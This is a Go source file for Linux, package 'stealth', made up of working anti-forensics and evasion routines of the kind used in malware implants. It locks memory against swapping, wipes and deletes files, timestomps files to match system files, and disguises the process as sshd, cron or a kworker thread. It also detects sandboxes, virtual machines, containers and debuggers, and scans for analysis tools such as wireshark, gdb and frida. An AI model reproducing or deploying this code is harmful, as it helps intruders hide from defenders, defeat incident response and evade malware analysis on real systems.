//go:build linux

package stealth

import (
	"context"
	"crypto/rand"
	"fmt"
	"log"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

// MemoryLock prevents the process memory from being swapped to disk
// by calling mlockall(MCL_CURRENT|MCL_FUTURE). This is a best-effort
// operation -- failure is logged but not fatal.
func MemoryLock() error {
	if runtime.GOOS != "linux" {
		return fmt.Errorf("anti_forensics: memory lock only supported on linux")
	}
	const MCL_CURRENT = 1
	const MCL_FUTURE = 2
	if err := syscall.Mlockall(MCL_CURRENT | MCL_FUTURE); err != nil {
		log.Printf("[anti_forensics] mlockall failed: %v (non-fatal)", err)
		return fmt.Errorf("anti_forensics: mlockall: %w", err)
	}
	log.Println("[anti_forensics] process memory locked -- will not swap")
	return nil
}

// SecureWipe overwrites the file at path using 3-pass DoD 5220.22-M
// standard, then deletes it.
//
// Pass 1: all zeros
// Pass 2: all 0xFF bytes
// Pass 3: random data
func SecureWipe(path string) error {
	info, err := os.Stat(path)
	if err != nil {
		return fmt.Errorf("anti_forensics: secure wipe stat: %w", err)
	}
	if info.IsDir() {
		return fmt.Errorf("anti_forensics: secure wipe: %s is a directory", path)
	}
	size := info.Size()

	patterns := []struct {
		name string
		fill byte
	}{
		{"zeros", 0x00},
		{"ones", 0xFF},
		{"random", 0x00}, // random pass handled separately
	}

	for i, p := range patterns {
		if err := overwritePass(path, size, p.fill, i == 2); err != nil {
			return fmt.Errorf("anti_forensics: pass %d (%s): %w", i+1, p.name, err)
		}
	}

	if err := os.Remove(path); err != nil {
		return fmt.Errorf("anti_forensics: remove after wipe: %w", err)
	}
	log.Printf("[anti_forensics] securely wiped %s (%d bytes, 3 passes)", path, size)
	return nil
}

// overwritePass writes a single overwrite pass over the target file.
// If useRandom is true, cryptographically random data is used instead of fillByte.
func overwritePass(path string, size int64, fillByte byte, useRandom bool) error {
	f, err := os.OpenFile(path, os.O_WRONLY, 0)
	if err != nil {
		return err
	}
	defer f.Close()

	bufSize := int64(4096)
	if bufSize > size && size > 0 {
		bufSize = size
	}
	buf := make([]byte, bufSize)

	if !useRandom {
		for i := range buf {
			buf[i] = fillByte
		}
	}

	remaining := size
	for remaining > 0 {
		chunk := buf
		if remaining < int64(len(buf)) {
			chunk = buf[:remaining]
		}
		if useRandom {
			if _, err := rand.Read(chunk); err != nil {
				return fmt.Errorf("rand read: %w", err)
			}
		}
		n, err := f.Write(chunk)
		if err != nil {
			return err
		}
		remaining -= int64(n)
	}
	return f.Sync()
}

// Timestomp modifies the file's access and modification timestamps
// to blend in with common system files. Uses /etc/hosts as reference
// if available, otherwise falls back to a plausible quiet-hour timestamp.
func Timestomp(path string) error {
	refTime := getReferenceTime()

	if err := os.Chtimes(path, refTime, refTime); err != nil {
		return fmt.Errorf("anti_forensics: timestomp: %w", err)
	}
	log.Printf("[anti_forensics] timestomped %s -> %v", path, refTime)
	return nil
}

// getReferenceTime returns a timestamp that blends with typical system files.
func getReferenceTime() time.Time {
	referencePaths := []string{
		"/etc/hosts",
		"/etc/hostname",
		"/bin/sh",
		"/usr/bin/env",
	}
	for _, ref := range referencePaths {
		if info, err := os.Stat(ref); err == nil {
			return info.ModTime()
		}
	}
	// Fallback: ~30 days ago, between 2-4 AM (quiet hours)
	now := time.Now()
	daysBack := 25 + time.Duration(time.Now().UnixNano()%10) // 25-35 days
	ref := now.Add(-daysBack * 24 * time.Hour)
	hourOffset := 2 + time.Duration(time.Now().UnixNano()%3) // 2-4 AM
	return time.Date(ref.Year(), ref.Month(), ref.Day(),
		int(hourOffset), int(now.UnixNano()%60), int(now.UnixNano()%60),
		0, ref.Location())
}

// ProcessNameSpoof changes the process name visible in ps/top by
// writing to /proc/self/comm (Linux-specific).
func ProcessNameSpoof(newName string) error {
	if runtime.GOOS != "linux" {
		return fmt.Errorf("anti_forensics: process name spoof only supported on linux")
	}
	// Write to /proc/self/comm to change the process name visible in ps/top.
	// This is the simplest approach and works on all modern Linux kernels.
	if err := os.WriteFile("/proc/self/comm", []byte(newName+"\n"), 0644); err != nil {
		// Fallback: use the prctl(PR_SET_NAME) syscall
		const PR_SET_NAME = 15
		nameBytes := append([]byte(newName), 0)
		if len(nameBytes) > 16 {
			nameBytes = nameBytes[:16]
		}
		// Use syscall.RawSyscall6 for prctl which takes 4 arguments on Linux
		// prctl(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5)
		arg2 := uintptr(0)
		if len(nameBytes) > 0 {
			arg2 = uintptr(unsafe.Pointer(&nameBytes[0]))
		}
		if _, _, errno := syscall.RawSyscall6(syscall.SYS_PRCTL, PR_SET_NAME, arg2, 0, 0, 0, 0); errno != 0 {
			return fmt.Errorf("anti_forensics: prctl PR_SET_NAME: %s", errno.Error())
		}
	}
	log.Printf("[anti_forensics] process name spoofed to %q", newName)
	return nil
}

// HideFromProc sets the process name to an innocent system process
// name to blend in with normal system activity.
func HideFromProc() error {
	innocentNames := []string{
		"systemd-journal",
		"kworker/0:0",
		"sshd",
		"cron",
		"dbus-daemon",
	}
	name := innocentNames[time.Now().UnixNano()%int64(len(innocentNames))]
	return ProcessNameSpoof(name)
}

// DetectSandbox checks for indicators that the process is running
// inside a virtualized or sandboxed environment.
func DetectSandbox() bool {
	indicators := 0

	if checkHypervisorCPU() {
		indicators++
		log.Printf("[anti_forensics] sandbox: hypervisor CPU flag detected")
	}
	if checkDMIProduct() {
		indicators++
		log.Printf("[anti_forensics] sandbox: virtual DMI product name detected")
	}
	if checkLowMemory() {
		indicators++
		log.Printf("[anti_forensics] sandbox: low memory (<2GB)")
	}
	if checkSandboxFiles() {
		indicators++
		log.Printf("[anti_forensics] sandbox: sandbox indicator files found")
	}

	return indicators >= 2
}

// checkHypervisorCPU reads /proc/cpuinfo for the hypervisor flag.
func checkHypervisorCPU() bool {
	data, err := os.ReadFile("/proc/cpuinfo")
	if err != nil {
		return false
	}
	return strings.Contains(string(data), "hypervisor")
}

// checkDMIProduct checks DMI product name for known VM identifiers.
func checkDMIProduct() bool {
	data, err := os.ReadFile("/sys/class/dmi/id/product_name")
	if err != nil {
		return false
	}
	name := strings.TrimSpace(string(data))
	vmProducts := []string{"VMware", "VirtualBox", "QEMU", "Xen", "KVM", "Bochs"}
	for _, p := range vmProducts {
		if strings.Contains(name, p) {
			return true
		}
	}
	return false
}

// checkLowMemory checks if total memory is below 2GB, common in sandboxes.
func checkLowMemory() bool {
	data, err := os.ReadFile("/proc/meminfo")
	if err != nil {
		return false
	}
	for _, line := range strings.Split(string(data), "\n") {
		if strings.HasPrefix(line, "MemTotal:") {
			fields := strings.Fields(line)
			if len(fields) >= 2 {
				kb, err := strconv.ParseInt(fields[1], 10, 64)
				if err == nil && kb < 2_000_000 { // < 2 GB
					return true
				}
			}
			return false
		}
	}
	return false
}

// checkSandboxFiles checks for the presence of sandbox-indicating files.
func checkSandboxFiles() bool {
	sandboxFiles := []string{
		"/proc/sysinfo",      // Sandboxie
		"/.dockerenv",        // Docker
		"/run/.containerenv", // Podman/containers
		"/.vagrant",          // Vagrant
	}
	for _, f := range sandboxFiles {
		if _, err := os.Stat(f); err == nil {
			return true
		}
	}
	return false
}

// DetectDebugger checks if the process is being traced by a debugger
// using multiple detection techniques.
func DetectDebugger() bool {
	// Method 1: Check TracerPid in /proc/self/status
	if checkTracerPid() {
		log.Printf("[anti_forensics] debugger: non-zero TracerPid")
		return true
	}

	// Method 2: Attempt ptrace(PTRACE_TRACEME) -- if we're being traced it fails
	if checkPtrace() {
		log.Printf("[anti_forensics] debugger: ptrace TRACEME failed (already traced)")
		return true
	}

	// Method 3: Check for debugger env vars
	if checkDebuggerEnv() {
		log.Printf("[anti_forensics] debugger: suspicious environment variables")
		return true
	}

	return false
}

// checkTracerPid reads /proc/self/status for a non-zero TracerPid.
func checkTracerPid() bool {
	data, err := os.ReadFile("/proc/self/status")
	if err != nil {
		return false
	}
	for _, line := range strings.Split(string(data), "\n") {
		if strings.HasPrefix(line, "TracerPid:") {
			fields := strings.Fields(line)
			if len(fields) >= 2 && fields[1] != "0" {
				return true
			}
			return false
		}
	}
	return false
}

// checkPtrace attempts PTRACE_TRACEME -- if we're already being traced, it fails.
func checkPtrace() bool {
	if runtime.GOOS != "linux" {
		return false
	}
	const PTRACE_TRACEME = 0
	_, _, errno := syscall.RawSyscall(syscall.SYS_PTRACE, PTRACE_TRACEME, 0, 0)
	return errno != 0
}

// checkDebuggerEnv checks for environment variables associated with debuggers.
func checkDebuggerEnv() bool {
	for _, env := range os.Environ() {
		for _, keyword := range []string{
			"DEBUGGER", "DEBUG", "GDB", "LLDB",
			"STRACE", "LTRACE", "FRIDA", "X64DBG",
			"IDA", "WINDBG", "R2PIPE", "VALGRIND",
		} {
			if strings.Contains(strings.ToUpper(env), keyword) {
				return true
			}
		}
	}
	return false
}

// AntiAnalysisScore returns a score from 0 (clean) to 10 (definitely being analyzed).
// The score aggregates multiple detection signals.
func AntiAnalysisScore() int {
	score := 0

	if DetectDebugger() {
		score += 4
	}
	if DetectSandbox() {
		score += 3
	}
	if suspiciousEnvScore() > 0 {
		score += 2
	}
	if checkLowMemory() {
		score += 1
	}

	if score > 10 {
		score = 10
	}
	return score
}

// suspiciousEnvScore counts suspicious environment indicators.
func suspiciousEnvScore() int {
	count := 0
	for _, env := range os.Environ() {
		for _, keyword := range []string{
			"LD_PRELOAD", "LD_LIBRARY_PATH",
			"AFL", "ASAN", "MSAN", "UBSAN",
		} {
			if strings.Contains(env, keyword) {
				count++
			}
		}
	}
	return count
}

// HasSuspiciousProcesses checks for known analysis tools running on the system.
func HasSuspiciousProcesses() bool {
	suspicious := []string{
		"wireshark", "tcpdump", "tshark", "dumpcap",
		"strace", "ltrace", "gdb", "lldb",
		"frida", "ollydbg", "x64dbg", "windbg",
		"procmon", "procexp", "autoruns",
	}
	for _, name := range suspicious {
		if pidOf(name) > 0 {
			log.Printf("[anti_forensics] suspicious process detected: %s", name)
			return true
		}
	}
	return false
}

// pidOf finds the PID of a process by name. Uses pgrep with a 1-second
// timeout, then falls back to scanning /proc for the process name.
// In minimal containers (Alpine/busybox), pgrep may hang — the timeout
// prevents test deadlocks.
func pidOf(name string) int {
	ctx, cancel := context.WithTimeout(context.Background(), 1*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, "pgrep", "-x", name)
	output, err := cmd.Output()
	if err == nil {
		pidStr := strings.TrimSpace(string(output))
		pid, err := strconv.Atoi(strings.Split(pidStr, "\n")[0])
		if err == nil && pid > 0 {
			return pid
		}
	}

	// Fallback: scan /proc for the process name (works everywhere).
	return findProcByName(name)
}

// findProcByName scans /proc/<pid>/comm for a matching process name.
// Only scans up to 500 PIDs to avoid WSL2 kernel exhaustion issues.
// Returns the first matching PID or 0 if none found.
func findProcByName(name string) int {
	entries, err := os.ReadDir("/proc")
	if err != nil {
		return 0
	}
	scanned := 0
	for _, entry := range entries {
		if !entry.IsDir() {
			continue
		}
		pid, err := strconv.Atoi(entry.Name())
		if err != nil || pid == 0 {
			continue
		}

		// Check /proc/<pid>/comm (15-char process name).
		comm, err := os.ReadFile(fmt.Sprintf("/proc/%d/comm", pid))
		if err == nil {
			commName := strings.TrimSpace(string(comm))
			if commName == name {
				return pid
			}
		}
		scanned++
		if scanned >= 500 {
			break
		}
	}
	return 0
}

// isWSL2 returns true if running under Windows Subsystem for Linux 2.
// Detected by checking for Microsoft-specific strings in /proc/version.
func isWSL2() bool {
	data, err := os.ReadFile("/proc/version")
	if err != nil {
		return false
	}
	return strings.Contains(string(data), "Microsoft") ||
		strings.Contains(string(data), "WSL")
}
